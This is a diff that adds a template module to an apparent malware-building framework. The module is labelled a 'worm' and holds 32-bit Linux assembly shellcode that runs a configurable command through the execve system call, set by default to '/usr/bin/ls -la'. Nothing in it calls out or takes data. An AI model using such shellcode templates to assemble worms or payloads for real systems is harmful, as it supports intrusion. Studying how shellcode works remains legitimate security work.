@@ -1,0 +1,39 @@
+#!name##Shellcode_Exe
+#!types##worm
+#!info##A worm created in assembler. Runs a command with a parameter placed on the stack. Creates an executable elf file (linux) and a C file with shellcode.
+#!reqVar##SC_exe##The path to run the program. ex '/usr/bin/ls'##str
+#!setVar##SC_exe##/usr/bin/ls
+#!reqVar##SC_arg##Argument to the program to be launched. ex '-la'##str
+#!setVar##SC_arg##-la##str
+#!banned##module##payload##starter##shadow##junk
+#!lang##asm
+#!globalVar##EXTERNAL_SCRIPT##Shellcoder_EXE##Compilation using external modules.
+#!globalVar##COMPILER_NAME##MC_elf32##The name of the compiler to build the executable file.
+#!globalVar##OS_EXEC##linux##Target executable file system
+#!system_FLAG##[L]
+#!processWorm##BasicShell
+
+global _start:
+
+section .text
+_start:
+
+    xor eax, eax
+    push eax
+    
+{{SC_arg}}
+    mov esi, esp
+    
+    push eax
+{{SC_exe}}
+    mov ebx, esp
+    
+    push eax
+    push esi
+    push ebx
+    mov ecx, esp
+    
+    mov edx, eax
+    mov al, 11
+    int 0x80
+    
